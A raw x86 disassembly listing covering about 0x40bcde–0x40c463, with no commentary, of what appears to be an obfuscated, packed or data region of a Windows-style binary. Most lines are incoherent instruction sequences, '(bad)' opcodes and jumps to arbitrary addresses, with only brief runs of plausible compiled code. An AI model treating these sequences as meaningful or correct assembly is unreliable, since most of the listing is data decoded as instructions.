  40bcde:	rol    DWORD PTR [ebp+0x578ad609],cl
  40bce4:	jno    0x40bd5f
  40bce6:	and    ecx,DWORD PTR [ecx+0x77]
  40bce9:	pusha  
  40bcea:	or     eax,0xb0812abe
  40bcef:	pop    ss
  40bcf0:	cwde   
  40bcf1:	aad    0xeb
  40bcf3:	leave  
  40bcf4:	xchg   edx,eax
  40bcf5:	fwait
  40bcf6:	sbb    ch,BYTE PTR [ebx-0x2143d657]
  40bcfc:	(bad)  
  40bcfd:	shr    eax,cl
  40bcff:	fadd   DWORD PTR [edx-0x7c]
  40bd02:	sar    DWORD PTR [esi-0x5adc53a],1
  40bd08:	jne    0x40bcd1
  40bd0a:	sbb    DWORD PTR [edx-0x52],ecx
  40bd0d:	cdq    
  40bd0e:	push   edx
  40bd0f:	mov    bh,0x72
  40bd11:	push   0x2269602d
  40bd16:	mov    esp,0x9062c32f
  40bd1b:	lods   al,BYTE PTR ds:[esi]
  40bd1c:	mov    dl,0xfe
  40bd1e:	(bad)  
  40bd1f:	rcl    DWORD PTR [esi+ebp*1],cl
  40bd22:	pop    ss
  40bd23:	xchg   edx,eax
  40bd24:	rcr    BYTE PTR [edx-0xf20bfb],1
  40bd2a:	outs   dx,BYTE PTR ds:[esi]
  40bd2b:	sub    ebp,DWORD PTR [esp+edx*4+0x1f5857dc]
  40bd32:	arpl   si,sp
  40bd34:	add    eax,0xdc45c47e
  40bd39:	popf   
  40bd3a:	xor    BYTE PTR [edx],0xc4
  40bd3d:	dec    al
  40bd3f:	mov    eax,ds:0x6826a04
  40bd44:	scas   al,BYTE PTR es:[edi]
  40bd45:	scas   al,BYTE PTR es:[edi]
  40bd46:	ss jns 0x40bcf6
  40bd49:	jmp    0xd0c97a48
  40bd4e:	and    al,0xc9
  40bd50:	pop    ebp
  40bd51:	call   0x7353:0x4e31e5af
  40bd58:	sub    ebp,ebx
  40bd5a:	pop    eax
  40bd5b:	jle    0x40bd3a
  40bd5d:	jo     0x40bd32
  40bd5f:	xor    esi,DWORD PTR [edx]
  40bd61:	inc    DWORD PTR [edx-0x32]
  40bd64:	pop    eax
  40bd65:	pop    edi
  40bd66:	ret    
  40bd67:	ds jne 0x40bdb1
  40bd6a:	mov    eax,ds:0x2438b9b0
  40bd6f:	imul   ecx,DWORD PTR [ebx+ecx*4+0x4d],0x3c6330c
  40bd77:	shl    BYTE PTR [ebx],0xce
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz xor eax,0xb9913871
  40bd90:	cld    
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bd3b
  40bd98:	fcomp  st(7)
  40bd9a:	pushf  
  40bd9b:	xor    edx,DWORD PTR [edi]
  40bd9d:	loopne 0x40be1e
  40bd9f:	xor    DWORD PTR [eax+0x17d8fcd1],edi
  40bda5:	fwait
  40bda6:	jae    0x40bdae
  40bda8:	mov    ecx,0x5b8c2de9
  40bdad:	mov    al,ds:0x7225e8a3
  40bdb2:	or     al,0x3e
  40bdb4:	jmp    0x40bdb1
  40bdb6:	and    eax,0xf6fe4eae
  40bdbb:	push   0x2ca31597
  40bdc0:	imul   eax,esp,0xffffffab
  40bdc3:	cmp    ecx,esi
  40bdc5:	imul   eax,DWORD PTR [ecx],0xfbcf3dee
  40bdcb:	test   DWORD PTR [edx-0x6d],esi
  40bdce:	aas    
  40bdcf:	inc    eax
  40bdd0:	outs   dx,DWORD PTR ds:[esi]
  40bdd1:	stos   BYTE PTR es:[edi],al
  40bdd2:	and    edi,edx
  40bdd4:	inc    ecx
  40bdd5:	push   ss
  40bdd6:	das    
  40bdd7:	fmul   st,st(7)
  40bdd9:	loopne 0x40bd81
  40bddb:	les    ecx,FWORD PTR [ebp+0x75]
  40bdde:	push   esi
  40bddf:	(bad)  
  40bde0:	mov    cl,0x40
  40bde2:	rcl    BYTE PTR [eax+0x21],1
  40bde5:	ret    
  40bde6:	ret    
  40bde7:	cld    
  40bde8:	jne    0x40be4a
  40bdea:	cmp    esi,ebx
  40bdec:	mov    dl,0x25
  40bdee:	jne    0x40bdee
  40bdf0:	inc    edi
  40bdf1:	mov    DWORD PTR [ebp+eax*4+0x70],0x9ebca703
  40bdf9:	js     0x40be02
  40bdfb:	jmp    0x40bdbc
  40bdfd:	pop    ss
  40bdfe:	into   
  40bdff:	mov    edx,0xb39812a2
  40be04:	fstp   TBYTE PTR [ebx+0x34e0cbd2]
  40be0a:	cmp    BYTE PTR [ebx],0xa2
  40be0d:	mov    ebp,0x16a5dc11
  40be12:	push   ecx
  40be13:	inc    ecx
  40be14:	stos   BYTE PTR es:[edi],al
  40be15:	dec    edi
  40be16:	push   eax
  40be17:	xor    al,0xd7
  40be19:	dec    esp
  40be1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1b:	inc    eax
  40be1c:	shr    BYTE PTR [esi],0x62
  40be1f:	mov    edi,0x18597f9
  40be24:	push   0x11
  40be26:	aas    
  40be27:	pushf  
  40be28:	sub    DWORD PTR [eax-0x6a],0xd99e70f1
  40be2f:	fnstsw WORD PTR [edx-0x5e]
  40be32:	les    eax,FWORD PTR [eax-0x1c]
  40be35:	and    eax,0xc08de1ad
  40be3a:	add    ecx,esi
  40be3c:	jmp    DWORD PTR [eax+0x2a]
  40be3f:	jp     0x40be65
  40be41:	sbb    ah,bl
  40be43:	cmp    cl,BYTE PTR [esi]
  40be45:	cs jne 0x40bdf9
  40be48:	mov    ebx,0x1f6ed905
  40be4d:	stos   BYTE PTR es:[edi],al
  40be4e:	xor    ebx,esi
  40be50:	out    dx,eax
  40be51:	fadd   st,st(5)
  40be53:	pushf  
  40be54:	enter  0x509d,0xd4
  40be58:	add    BYTE PTR [edi],dl
  40be5a:	sti    
  40be5b:	and    al,dh
  40be5d:	jmp    DWORD PTR [eax-0xe]
  40be60:	push   ebp
  40be61:	xchg   edi,eax
  40be62:	push   esp
  40be63:	push   esp
  40be64:	shr    BYTE PTR [ecx-0x2529311e],0xf8
  40be6b:	xlat   BYTE PTR ds:[ebx]
  40be6c:	add    DWORD PTR [edx-0x55],ebp
  40be6f:	scas   eax,DWORD PTR es:[edi]
  40be70:	out    0x49,eax
  40be72:	clc    
  40be73:	ret    0xd036
  40be76:	in     al,dx
  40be77:	pcmpeqw mm4,mm0
  40be7a:	jecxz  0x40becd
  40be7c:	mov    ebx,0x60c53f58
  40be81:	inc    ebp
  40be82:	jge    0x40be23
  40be84:	jmp    0x7b0b:0x97b4f035
  40be8b:	retf   0xc4bd
  40be8e:	repnz (bad) 
  40be90:	push   ecx
  40be91:	or     al,0x76
  40be93:	and    DWORD PTR [ecx+0x36f977d],eax
  40be99:	xor    al,0x68
  40be9b:	cmc    
  40be9c:	cwde   
  40be9d:	call   0xb148:0xfd4b6dfb
  40bea4:	sbb    BYTE PTR [edx],ch
  40bea6:	(bad)  
  40bea7:	cs push cs
  40bea9:	lahf   
  40beaa:	jecxz  0x40bee9
  40beac:	mov    dh,BYTE PTR [ebp+0x596ce2fe]
  40beb2:	stos   DWORD PTR es:[edi],eax
  40beb3:	fwait
  40beb4:	lods   al,BYTE PTR fs:[esi]
  40beb6:	mov    eax,ds:0x220f9f17
  40bebb:	int    0xa1
  40bebd:	test   al,0x30
  40bebf:	dec    eax
  40bec0:	pusha  
  40bec1:	and    bl,BYTE PTR [esi]
  40bec3:	ins    DWORD PTR es:[edi],dx
  40bec4:	loop   0x40bf44
  40bec6:	pop    esi
  40bec7:	aam    0x39
  40bec9:	cdq    
  40beca:	cs call 0xbbb6:0x40113911
  40bed2:	push   ecx
  40bed3:	cmp    dl,cl
  40bed5:	aas    
  40bed6:	or     BYTE PTR [esi+0x544e35e4],dl
  40bedc:	adc    eax,0xe9668939
  40bee1:	mov    edx,0x4c334766
  40bee6:	dec    edx
  40bee7:	(bad)  
  40bee8:	or     cl,cl
  40beea:	lods   al,BYTE PTR ds:[esi]
  40beeb:	fwait
  40beec:	pop    edx
  40beed:	mov    dh,0x21
  40beef:	enter  0x4218,0x3d
  40bef3:	stos   DWORD PTR es:[edi],eax
  40bef4:	sub    eax,DWORD PTR [ebx-0x3e0bbdb7]
  40befa:	call   0xd6a3:0xfc2d382
  40bf01:	cwde   
  40bf02:	(bad)  
  40bf03:	arpl   WORD PTR [ebx],dx
  40bf05:	mov    ebx,0xf8b0926c
  40bf0a:	xchg   edi,eax
  40bf0b:	lods   eax,DWORD PTR ds:[esi]
  40bf0c:	lock rcr ecx,1
  40bf0f:	repz mov dl,bh
  40bf12:	mov    BYTE PTR [eax-0x43],dl
  40bf15:	dec    ebx
  40bf16:	push   eax
  40bf17:	imul   ecx,DWORD PTR [eax+edi*8+0x70],0x898d52a5
  40bf1f:	dec    edx
  40bf20:	cld    
  40bf21:	cmp    DWORD PTR ds:[ecx+0x7c],ebp
  40bf25:	(bad)  
  40bf26:	test   al,0x78
  40bf28:	push   ebx
  40bf29:	dec    ebp
  40bf2a:	aaa    
  40bf2b:	or     BYTE PTR [ebx],al
  40bf2d:	cmp    eax,ecx
  40bf2f:	lods   al,BYTE PTR ds:[esi]
  40bf30:	jnp    0x40bf7e
  40bf32:	ficom  WORD PTR [eax+0x3]
  40bf35:	add    DWORD PTR [ecx],esi
  40bf37:	mov    ds:0x95a60ed8,al
  40bf3c:	sub    al,0x1
  40bf3e:	mov    ds:0x2b3a5769,al
  40bf43:	bound  esi,QWORD PTR [ebx+0x35]
  40bf46:	mov    al,0xc5
  40bf48:	es iret 
  40bf4a:	jmp    0x1fd199ff
  40bf4f:	cdq    
  40bf50:	inc    ebx
  40bf51:	rcl    BYTE PTR [ecx+0x59af140],1
  40bf57:	adc    ecx,DWORD PTR [edi+0x3250d288]
  40bf5d:	and    eax,0xebbfe70b
  40bf62:	adc    eax,0xc55f1c2a
  40bf67:	dec    eax
  40bf68:	pop    eax
  40bf69:	fstp   QWORD PTR [edi+0xb]
  40bf6c:	repnz or BYTE PTR [edx+0x3a39378e],dl
  40bf73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf74:	fwait
  40bf75:	retf   0xfba2
  40bf78:	or     bl,ch
  40bf7a:	call   0x773ffb53
  40bf7f:	sub    al,0xc7
  40bf81:	mov    cl,0xac
  40bf83:	mov    ecx,0xfb5d7907
  40bf88:	fwait
  40bf89:	mov    bl,0x96
  40bf8b:	(bad)  
  40bf8c:	cmp    esp,DWORD PTR [eax+0xc]
  40bf8f:	cmc    
  40bf90:	lahf   
  40bf91:	out    dx,eax
  40bf92:	jbe    0x40bfc7
  40bf94:	sbb    DWORD PTR [ebp+0x1b],esi
  40bf97:	pushf  
  40bf98:	mov    bl,ch
  40bf9a:	ins    BYTE PTR es:[edi],dx
  40bf9b:	jmp    0x5437:0x5a99ce7f
  40bfa2:	and    al,0x7f
  40bfa4:	or     BYTE PTR [eax-0x49655e35],al
  40bfaa:	dec    esp
  40bfab:	or     bh,0x3b
  40bfae:	sub    al,0x76
  40bfb0:	sar    BYTE PTR [edx],cl
  40bfb2:	neg    BYTE PTR [edx-0x27]
  40bfb5:	pop    esp
  40bfb6:	into   
  40bfb7:	imul   DWORD PTR [ebp+0x2a]
  40bfba:	mov    edx,0x1920c9e
  40bfbf:	pop    ecx
  40bfc0:	sbb    al,0x56
  40bfc2:	lock sub DWORD PTR [esi+0x5ea8cd4c],esp
  40bfc9:	mov    cl,0xc0
  40bfcb:	inc    esi
  40bfcc:	imul   ecx,esi,0x2c08d138
  40bfd2:	sbb    BYTE PTR [ebp+ebx*2+0x48dbf542],dh
  40bfd9:	xlat   BYTE PTR ds:[ebx]
  40bfda:	cmc    
  40bfdb:	fnstsw WORD PTR [ebp+0x3012de91]
  40bfe1:	sbb    al,BYTE PTR [esi-0x31fbfddb]
  40bfe7:	dec    ebp
  40bfe8:	into   
  40bfe9:	ins    BYTE PTR es:[edi],dx
  40bfea:	mov    ecx,0x327eb6a
  40bfef:	test   eax,0xd0e7bb62
  40bff4:	jmp    0xe5e91c75
  40bff9:	push   esp
  40bffa:	cdq    
  40bffb:	rcl    eax,0x2d
  40bffe:	dec    ebp
  40bfff:	into   
  40c000:	cdq    
  40c001:	cli    
  40c002:	and    eax,0x7719f82c
  40c007:	xor    esp,0xffffff83
  40c00a:	push   0xffffff8d
  40c00c:	pop    ebp
  40c00d:	and    DWORD PTR [edi+0x6f],edx
  40c010:	dec    edi
  40c011:	dec    edx
  40c012:	or     dl,cl
  40c014:	lahf   
  40c015:	push   ebx
  40c016:	xor    cl,BYTE PTR [ecx-0x253772e5]
  40c01c:	adc    edi,DWORD PTR [edi]
  40c01e:	dec    BYTE PTR [edi]
  40c020:	sub    DWORD PTR [edi+0x2d],ebx
  40c023:	mov    ebx,0xe0097e83
  40c028:	imul   eax,DWORD PTR [edx],0xffffffee
  40c02b:	add    eax,DWORD PTR [edi+0x5f1c0fcb]
  40c031:	sbb    BYTE PTR [eax+0x5b],cl
  40c034:	mov    esi,0x92e8a0aa
  40c039:	and    eax,ebx
  40c03b:	pop    esp
  40c03c:	out    0xf4,eax
  40c03e:	add    esi,0xb1061e07
  40c044:	test   DWORD PTR [eax+0x7e303aab],0xe632e252
  40c04e:	imul   eax,DWORD PTR [ecx+0x14c24d6],0x987b6a8
  40c058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c059:	call   0xa05982a2
  40c05e:	xor    eax,0xd5c4e6c0
  40c063:	push   es
  40c064:	push   edx
  40c065:	call   0x67c348fb
  40c06a:	add    eax,0x96a7cf08
  40c06f:	ss sti 
  40c071:	rol    BYTE PTR [esp+edi*8-0x56],0x4b
  40c076:	cmp    eax,DWORD PTR [ecx+0x38]
  40c079:	sub    ebp,edx
  40c07b:	fs ins BYTE PTR es:[edi],dx
  40c07d:	jl     0x40c09f
  40c07f:	arpl   WORD PTR [esi],ax
  40c081:	je     0x40c06d
  40c083:	mov    ebx,0x97962db8
  40c088:	mov    ch,0x5b
  40c08a:	scas   al,BYTE PTR es:[edi]
  40c08b:	xchg   esi,eax
  40c08c:	sbb    al,0xa1
  40c08e:	jge    0x40c064
  40c090:	and    esp,DWORD PTR [edx+0x5d11dfb6]
  40c096:	out    dx,al
  40c097:	and    eax,0x6d7cf5
  40c09c:	sahf   
  40c09d:	adc    eax,0xb23b5176
  40c0a2:	in     al,0x9b
  40c0a4:	adc    BYTE PTR [eax-0x5c],ch
  40c0a7:	or     al,0x27
  40c0a9:	push   esi
  40c0aa:	push   0xfffffffa
  40c0ac:	pop    edi
  40c0ad:	cmp    BYTE PTR [edi+0x7],0x2
  40c0b1:	ja     0x40c0a1
  40c0b3:	and    eax,0xf8fa9e4d
  40c0b8:	lea    eax,ds:0x4a03363c
  40c0be:	fbstp  TBYTE PTR [ecx-0x4d247560]
  40c0c4:	mov    cl,0x36
  40c0c6:	stos   BYTE PTR es:[edi],al
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	ins    BYTE PTR es:[edi],dx
  40c104:	jnp    0x40c08b
  40c106:	punpckhwd mm7,mm3
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c10a
  40c110:	adc    al,0x69
  40c112:	push   ds
  40c113:	xchg   edi,eax
  40c114:	rcl    BYTE PTR [eax],0x42
  40c117:	add    ch,cl
  40c119:	cmp    al,0x8b
  40c11b:	jg     0x40c0f0
  40c11d:	hlt    
  40c11e:	mov    ebp,0xcc7c7619
  40c123:	mov    ds:0x73cb1922,al
  40c128:	ss popf 
  40c12a:	fs stos BYTE PTR es:[edi],al
  40c12c:	dec    esi
  40c12d:	into   
  40c12e:	lahf   
  40c12f:	mov    ch,0x57
  40c131:	mov    cl,0xc2
  40c133:	push   0xcff9f55f
  40c138:	(bad)  
  40c139:	(bad)  
  40c13a:	in     eax,dx
  40c13b:	mov    ebp,0xc38dcf31
  40c140:	cmp    dh,0x2
  40c143:	and    DWORD PTR [ecx+0x6e],esp
  40c146:	and    DWORD PTR [ecx+eax*2-0x483edb03],esi
  40c14d:	pop    es
  40c14e:	mov    edi,0xc3928cb6
  40c153:	push   eax
  40c154:	inc    ebx
  40c155:	iret   
  40c156:	fs mov edi,0x75cad603
  40c15c:	call   0x9352:0x3c4d0fe4
  40c163:	adc    edi,edi
  40c165:	repz inc edi
  40c167:	inc    eax
  40c168:	xor    eax,0x763ad033
  40c16d:	fadd   QWORD PTR [edx]
  40c16f:	stos   DWORD PTR es:[edi],eax
  40c170:	jb     0x40c173
  40c172:	into   
  40c173:	pop    esp
  40c174:	add    ch,dh
  40c176:	pop    edx
  40c177:	jmp    0x40c19e
  40c179:	cdq    
  40c17a:	pop    esp
  40c17b:	mov    eax,0xf834ffaf
  40c180:	jl     0x40c11c
  40c182:	retf   
  40c183:	sbb    DWORD PTR [eax+eiz*2],ebx
  40c186:	mov    WORD PTR [eax-0x58ecf7cb],gs
  40c18c:	in     eax,dx
  40c18d:	or     DWORD PTR [esp+ebx*4+0x4bf6400f],ebx
  40c194:	and    DWORD PTR [eax-0x1516829b],ecx
  40c19a:	sub    edx,DWORD PTR [eax]
  40c19c:	pop    edx
  40c19e:	outs   dx,DWORD PTR ds:[esi]
  40c19f:	ror    DWORD PTR [ebx+0x53928436],0x65
  40c1a6:	inc    edi
  40c1a7:	push   esi
  40c1a8:	hlt    
  40c1a9:	loop   0x40c1cf
  40c1ab:	stos   DWORD PTR es:[edi],eax
  40c1ac:	xor    ch,BYTE PTR [edi+edi*4-0xa]
  40c1b0:	out    0xc0,al
  40c1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1b3:	rol    DWORD PTR [eax-0x6d4b56c5],cl
  40c1b9:	inc    ecx
  40c1ba:	sub    dh,bh
  40c1bc:	jg     0x40c1fd
  40c1be:	xchg   edx,eax
  40c1bf:	outs   dx,DWORD PTR ds:[esi]
  40c1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c1:	lock dec ebp
  40c1c3:	or     BYTE PTR [ecx],bl
  40c1c5:	push   edx
  40c1c6:	sbb    al,0x3c
  40c1c8:	outs   dx,BYTE PTR ds:[esi]
  40c1c9:	jge    0x40c218
  40c1cb:	shl    DWORD PTR [ebx-0x5a],0xea
  40c1cf:	jp     0x40c1c4
  40c1d1:	pop    esp
  40c1d2:	jnp    0x40c1a8
  40c1d4:	sub    bh,BYTE PTR ds:[eax+0x6e]
  40c1d8:	fcmovne st,st(1)
  40c1da:	sub    eax,0x52bc6627
  40c1df:	and    eax,DWORD PTR [esi+0x77]
  40c1e2:	fisubr DWORD PTR [eax+0x605050d9]
  40c1e8:	mov    dl,0x80
  40c1ea:	shl    DWORD PTR [eax+0x27ee4518],cl
  40c1f0:	mov    ah,0x97
  40c1f2:	jb     0x40c228
  40c1f4:	and    esp,edi
  40c1f6:	sub    al,0x84
  40c1f8:	add    cl,0xdc
  40c1fb:	mov    ds:0x48709778,al
  40c200:	jae    0x40c1bc
  40c202:	not    DWORD PTR [ebx+0x76]
  40c205:	jg     0x40c27c
  40c207:	loope  0x40c1f9
  40c209:	xor    eax,0xe655462
  40c20e:	cmp    eax,0x2cfc4e89
  40c213:	dec    ebx
  40c214:	sub    al,0x97
  40c216:	enter  0x6da9,0x9d
  40c21a:	outs   dx,DWORD PTR ds:[esi]
  40c21b:	dec    eax
  40c21c:	push   ds
  40c21d:	dec    esp
  40c21e:	dec    edi
  40c21f:	dec    eax
  40c220:	pop    ebx
  40c221:	ins    DWORD PTR es:[edi],dx
  40c222:	les    edi,FWORD PTR [edx]
  40c224:	in     eax,dx
  40c225:	add    eax,0xa8e300a1
  40c22a:	pop    ebp
  40c22b:	mov    ?,edi
  40c22d:	stos   DWORD PTR es:[edi],eax
  40c22e:	or     cl,BYTE PTR [ecx]
  40c230:	cmp    dl,BYTE PTR [ecx+0x107470ce]
  40c236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c237:	dec    ebp
  40c238:	mov    al,bl
  40c23a:	aas    
  40c23b:	push   cs
  40c23c:	sti    
  40c23d:	aas    
  40c23e:	xor    BYTE PTR [ebp-0x7f],ch
  40c241:	sub    al,0xc5
  40c243:	fidivr WORD PTR [eax+0x7e]
  40c246:	jbe    0x40c2c6
  40c248:	sbb    al,0x61
  40c24a:	jo     0x40c270
  40c24c:	frstor [ebp+0x71]
  40c24f:	inc    eax
  40c250:	loope  0x40c21c
  40c252:	adc    DWORD PTR [ebx-0x27],esp
  40c255:	jg     0x40c228
  40c257:	stc    
  40c258:	or     DWORD PTR [edx+0x26],esp
  40c25b:	mov    ebp,0x96a1d19a
  40c260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c261:	or     eax,0x393545d3
  40c266:	ins    DWORD PTR es:[edi],dx
  40c267:	mov    edi,0x4c63b1bc
  40c26c:	mov    dh,0x96
  40c26e:	nop
  40c26f:	jo     0x40c2bd
  40c271:	mov    ecx,esi
  40c273:	idiv   DWORD PTR [eax+0x44]
  40c276:	jbe    0x40c2cd
  40c278:	mov    cl,0x1d
  40c27a:	mov    ds,edx
  40c27c:	xor    al,0x2e
  40c27e:	gs jg  0x40c252
  40c281:	jp     0x40c222
  40c283:	ret    0xaa54
  40c286:	or     ah,BYTE PTR [eax]
  40c288:	cmc    
  40c289:	mov    bh,0xee
  40c28b:	cmp    eax,0x3b286ad1
  40c290:	sbb    eax,0x8518e23c
  40c295:	jp     0x40c2be
  40c297:	or     BYTE PTR [edi-0x588e034d],al
  40c29d:	popf   
  40c29e:	dec    ecx
  40c29f:	pop    ebx
  40c2a0:	gs pop esi
  40c2a2:	(bad)  
  40c2a3:	push   esi
  40c2a4:	sbb    BYTE PTR [ebx-0x13],dh
  40c2a7:	mov    ds:0x4d22d894,al
  40c2ac:	sub    dh,BYTE PTR [edi+0x6adaa9c2]
  40c2b2:	dec    esi
  40c2b3:	fwait
  40c2b4:	scas   eax,DWORD PTR es:[edi]
  40c2b5:	scas   eax,DWORD PTR es:[edi]
  40c2b6:	mov    edi,0x89b8a1af
  40c2bb:	call   0x619a:0x42c796f4
  40c2c2:	xchg   edi,eax
  40c2c3:	push   0x72
  40c2c5:	inc    ecx
  40c2c6:	push   ds
  40c2c7:	loope  0x40c2b0
  40c2c9:	mov    eax,ds:0x213d53e8
  40c2ce:	mov    ecx,0x52ac14e0
  40c2d3:	daa    
  40c2d4:	stos   BYTE PTR es:[edi],al
  40c2d5:	sbb    esp,edi
  40c2d7:	xor    edi,DWORD PTR [edi]
  40c2d9:	cmp    esp,DWORD PTR [ebx+0xaf73d29]
  40c2df:	adc    bl,BYTE PTR [ecx+eiz*8-0x68]
  40c2e3:	mov    bh,0x18
  40c2e5:	nop
  40c2e6:	or     al,0x5d
  40c2e8:	mov    ebx,0x46aa2693
  40c2ed:	cld    
  40c2ee:	std    
  40c2ef:	dec    esi
  40c2f0:	or     eax,0xf6b83730
  40c2f5:	inc    BYTE PTR [edi]
  40c2f7:	jl     0x40c312
  40c2f9:	inc    eax
  40c2fa:	adc    BYTE PTR [edx-0x1a],al
  40c2fd:	sbb    al,0xd3
  40c2ff:	pushf  
  40c300:	fucomp st(7)
  40c302:	dec    ecx
  40c303:	pop    ebx
  40c304:	push   ebx
  40c305:	mov    eax,0xd3654356
  40c30a:	xor    BYTE PTR [ebp-0x63],dl
  40c30d:	xchg   edx,eax
  40c30e:	sub    eax,DWORD PTR [esi-0x16]
  40c311:	shl    DWORD PTR cs:[edi+0x6dfb0abe],cl
  40c318:	sub    DWORD PTR [eax+ebp*8],eax
  40c31b:	popa   
  40c31c:	xor    eax,0xcb16b897
  40c321:	ret    0xd44e
  40c324:	(bad)  
  40c325:	cmp    BYTE PTR [ebx+0x4c],al
  40c328:	jmp    0x7d4d38b4
  40c32d:	dec    esp
  40c32e:	scas   eax,DWORD PTR es:[edi]
  40c32f:	sub    DWORD PTR [ebp+0x6c6643af],esi
  40c335:	push   esp
  40c336:	add    cl,bh
  40c338:	sbb    BYTE PTR [ebx-0x73967eed],dl
  40c33e:	push   edx
  40c33f:	retf   
  40c340:	mov    ecx,0x5be7f789
  40c345:	ins    DWORD PTR es:[edi],dx
  40c346:	lods   al,BYTE PTR ds:[esi]
  40c347:	imul   eax,ebp,0xc957deb0
  40c34d:	ror    eax,1
  40c34f:	add    ebp,DWORD PTR [ebx]
  40c351:	inc    ebp
  40c352:	sub    esi,edx
  40c354:	lea    ebx,[eax+0x2cfb69cb]
  40c35a:	(bad)  
  40c35b:	and    dl,BYTE PTR [ecx]
  40c35d:	mov    ebp,0xda5619f4
  40c362:	call   0x3d2:0x505c89a0
  40c369:	pop    eax
  40c36a:	mov    bl,0x17
  40c36c:	or     DWORD PTR [ecx-0x7b],edi
  40c36f:	pop    edx
  40c370:	xchg   cl,cl
  40c372:	les    ebp,FWORD PTR [ecx]
  40c374:	mov    BYTE PTR [ebx],ah
  40c376:	xchg   ebx,eax
  40c377:	loopne 0x40c300
  40c379:	adc    bl,BYTE PTR [edx+0x406d5184]
  40c37f:	out    0x6a,al
  40c381:	(bad)  
  40c382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c383:	sbb    DWORD PTR [ebp-0xa],ecx
  40c386:	arpl   WORD PTR [ebx+ebx*8-0x5585dc10],ax
  40c38d:	and    DWORD PTR [eax],ecx
  40c38f:	jl     0x40c3a4
  40c391:	push   ss
  40c392:	xlat   BYTE PTR ds:[ebx]
  40c393:	fstp   st(1)
  40c395:	and    esp,ebp
  40c397:	inc    ebp
  40c398:	cmp    DWORD PTR [edx+0x5c],esp
  40c39b:	add    DWORD PTR [eax],edx
  40c39d:	sbb    esi,DWORD PTR [edx+0x3b]
  40c3a0:	and    ch,BYTE PTR [ebp+0x70]
  40c3a3:	mov    gs:0x9f2b320f,eax
  40c3a9:	add    al,0x38
  40c3ab:	cmc    
  40c3ac:	cmp    al,0xa7
  40c3ae:	in     eax,0x2a
  40c3b0:	adc    BYTE PTR [eax-0x6a],dl
  40c3b3:	cli    
  40c3b4:	mov    ds:0x47b5e6cb,eax
  40c3b9:	push   edx
  40c3ba:	push   ebp
  40c3bb:	mov    BYTE PTR [edx+0x6bad4a36],0x46
  40c3c2:	and    DWORD PTR ds:0x38a804f9,ebx
  40c3c8:	inc    BYTE PTR [edx+0x52706f8d]
  40c3ce:	inc    esp
  40c3cf:	div    ecx
  40c3d1:	je     0x40c37c
  40c3d3:	dec    eax
  40c3d4:	xchg   ebx,eax
  40c3d5:	jg     0x40c366
  40c3d7:	add    cl,bh
  40c3d9:	adc    ch,bh
  40c3db:	repz enter 0xa3b7,0xe0
  40c3e0:	dec    eax
  40c3e1:	mov    bh,bl
  40c3e3:	adc    BYTE PTR [ecx+0x71074a34],0xde
  40c3ea:	jle    0x40c3da
  40c3ec:	outs   dx,DWORD PTR ds:[esi]
  40c3ed:	neg    bl
  40c3ef:	cmp    al,0xf6
  40c3f1:	add    ebp,eax
  40c3f3:	xchg   edx,eax
  40c3f4:	ror    edi,0xb8
  40c3f7:	push   es
  40c3f8:	dec    edi
  40c3f9:	aam    0xc4
  40c3fb:	mov    ebx,DWORD PTR [esp+ecx*4+0x50]
  40c3ff:	adc    BYTE PTR [eax],dh
  40c401:	scas   eax,DWORD PTR es:[edi]
  40c402:	and    BYTE PTR [edi-0x12],dl
  40c405:	or     DWORD PTR [ebx-0x51],0x20
  40c409:	jecxz  0x40c3e0
  40c40b:	mov    bl,0x51
  40c40d:	rcr    DWORD PTR [ecx-0x2f],1
  40c410:	cdq    
  40c411:	cmp    eax,eax
  40c413:	or     DWORD PTR [esi],0x7c
  40c416:	sub    DWORD PTR ds:0xf64b0bae,esi
  40c41c:	dec    edi
  40c41d:	inc    eax
  40c41e:	aam    0xa0
  40c420:	push   ss
  40c421:	push   0x88725b03
  40c426:	sbb    esp,esp
  40c428:	sbb    BYTE PTR [ebp+0x7e095583],cl
  40c42e:	sbb    DWORD PTR [ecx-0x5],0xffffffb1
  40c432:	add    al,0xa1
  40c434:	out    0x90,al
  40c436:	pop    ebx
  40c437:	cmp    al,0x66
  40c439:	scas   al,BYTE PTR es:[edi]
  40c43a:	(bad)  
  40c43b:	xchg   esp,eax
  40c43c:	mov    gs,WORD PTR [esi+edx*8-0x73]
  40c440:	test   BYTE PTR [eax],cl
  40c442:	fwait
  40c443:	jb     0x40c477
  40c445:	add    BYTE PTR [esi-0x77],ah
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
